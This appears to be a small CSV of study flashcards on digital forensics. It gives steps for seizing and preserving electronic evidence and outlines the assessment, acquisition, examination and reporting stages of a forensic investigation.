Procedure/steps for collecting and preserving electronic evidence,"<ol><li>If the device is on, unplug the power cable from the device. This will ""freeze"" the media/hard drive in its current state. This should not be done for UNIX based systema or MS Exchange servers as serious file system damage could occur. Use the normal shutdown procedure. If it's a laptop, unplug the power cord and the battery.</li><li>Remove storage devices from the computer (e.g. hard drives, solid-state drives (SSD))</li><li>Store storage devices into anti-static evidence bags.</li><li>Seal the computer by placing evidence tape along the computer's housing, as well as ports on the computer.</li></ul>"
Process of Forensic Investigation,"<ol><li><b>Assessment:</b> Computer forensic examiners should assess digital evidence thoroughly with respect to the scope of the case to determine the course of action to take.</li><li><b>Acquisition:</b> Digital evidence, by its very nature, is fragile and can be altered, damaged, or destroyed by improper handling or examination. Examination is best conducted on a copy of the original evidence. The original evidence should be acquired in a manner that protects and preserves the integrity of the evidence.</li><li><b>Examination:</b> The purpose of the examination process is to extract and analyze digital evidence. Extraction refers to the recovery of data from its media. Analysis refers to the interpretation of the recovered data and putting it in a logical and useful format.</li><li><b>Documenting and Reporting:</b> Actions and observations should be documented throughout the forensic processing of evidence. This will conclude with the preparation of a written report of the findings.</li></ol>"
